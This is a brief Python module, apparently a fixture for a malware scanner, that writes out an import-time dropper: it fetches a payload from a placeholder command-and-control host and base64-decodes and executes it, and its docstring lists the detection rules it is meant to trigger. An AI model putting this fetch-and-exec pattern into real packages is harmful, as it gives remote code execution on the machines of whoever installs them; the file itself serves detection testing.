"""Import-time second-stage dropper (sanitized fixture).

DETECTION TARGETS (engine never executes this): import-time network fetch of a remote
payload + decode-and-execute. Triggers ST-NET-PY, ST-OBF-DECODE-EXEC, ST-DYN-PY.
"""

import base64
import urllib.request

# Fetch a second stage from a C2 and run it the moment the package is imported.
_url = "http://example-c2.invalid/stage2"
_payload = urllib.request.urlopen(_url).read()  # noqa: S310 - fixture, not executed
exec(base64.b64decode(_payload))  # noqa: S102 - decode-and-exec is the detection target
